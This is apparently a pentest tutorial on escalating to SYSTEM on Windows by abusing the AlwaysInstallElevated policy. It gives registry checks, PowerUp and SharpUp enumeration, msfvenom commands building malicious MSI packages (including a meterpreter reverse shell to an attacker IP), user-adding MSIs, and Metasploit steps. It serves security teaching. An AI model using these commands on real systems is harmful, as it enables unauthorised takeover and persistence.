# AlwaysInstallElevated Exploitation

## Target requirements

- The target needs to have those values in the registry: 
  - In `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer` with the AlwaysInstallElevated set to 1
  - In `Computer\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer` with the AlwaysInstallElevated set to 1
This means that installation packages are installed with elevated privileges 

### Enumerate with cmd

- Type `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` in a cmd prompt should be set to 1
- Type `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` should be one as well  
![image](https://user-images.githubusercontent.com/96747355/162576171-430c4e05-d1be-42c4-a840-d844a87cb99e.png)  

## Exploitation

- You should have a shell with covenant or metasploit or netcat.  
We will use Covenant and Metasploit here.

### Covenant

#### Enumerate with SharpUp audit

- In your shell type `SharpUp audit`
- In the results you should see this:
  ```
  === AlwaysInstallElevated Registry Keys ===

    HKLM:    1
    HKCU:    1
  ```

#### Enumerate with powerup

- In the shell we will type PowerShellImport, type enter and fetch PoweUp.ps1 (if you do not have it you can get it [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) )  
- Click on execute
- Type `powershell invoke-allchecks` in your shell
- We should see this
  ```
  [*] Checking for AlwaysInstallElevated registry key...
  AbuseFunction : Write-UserAddMSI

  ```

#### Exploitation

- generate a payload with msfvenom `msfvenom -p windows/exec CMD="" -f msi -o exploitalwaysinstalled.msi` between the quotes put copy and paste an encoded launcher.
- Upload your file in the target using Upload command from covenant (type `Upload` and enter, file the file path for the target and browse to the file in your attack machine)
- run it using `shell msiexec /quiet /qn /i exploitalwaysinstalled.msi
- We should get a prompt for another reverse shell in our grunts as an elevated user
  ```
  > whoami
  NT AUTHORITY\SYSTEM
  ```

#### Exploitation with powerup

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Write-UserAddMSI`
- It will set up a malicious MSI called `UserAdd`
- And we will be able to add a user  
![image](https://user-images.githubusercontent.com/96747355/162576431-66e49563-26cd-45fc-a673-63e9f0a42561.png)
- Our user has been added  
![image](https://user-images.githubusercontent.com/96747355/162576458-7498d8e5-bfc7-4dba-9b5c-9a73ac869622.png)  


### Metasploit

- Interact with a session you should already have from initial foothold `sessions -i num-of-session`

#### Enumerate

- Launch `run post/multi/recon/local_exploit_suggester`
- You should see: `- exploit/windows/local/always_install_elevated: The target is vulnerable.`

#### Exploitation

- Background your session with ctrl z
- Type `use exploit/windows/local/always_install_elevated`
- set session to the number of the session you have on your target 
- type `exploit -j`
- list the sessions you should have another one running as authority system
- type ps and look for a process under session 1 so that we can migrate to it 
- We can use winlogon.exe ` 620   520   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe`
- Migrate to it using `migrate PID-number` in our example it is going to be `migrate 520`  

**OR**  

- `msfconsole`
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set lhost your-Kali-IP`
- `run`
- In another console tab `msfvenom -p windows/meterpreter/reverse_tcp lhost=Your-Kali-IP -f msi -o setup.msi`
- Get the generated msi in your target (python server -> browser from target)
- In your target Place `setup.msi` in a folder where you have write access
- Open command prompt and type: `msiexec /quiet /qn /i C:\Folder\you\chose\setup.msi`
- You should get an elevated shell in msfconsole  
![image](https://user-images.githubusercontent.com/96747355/162576948-dfc37754-0345-408f-a344-5248975f34b8.png)  


## Resources

{% embed url="https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers" %} TCM security Academy -  Movement pivoting and persistence for pentesters and ethical hacker {% endembed %}
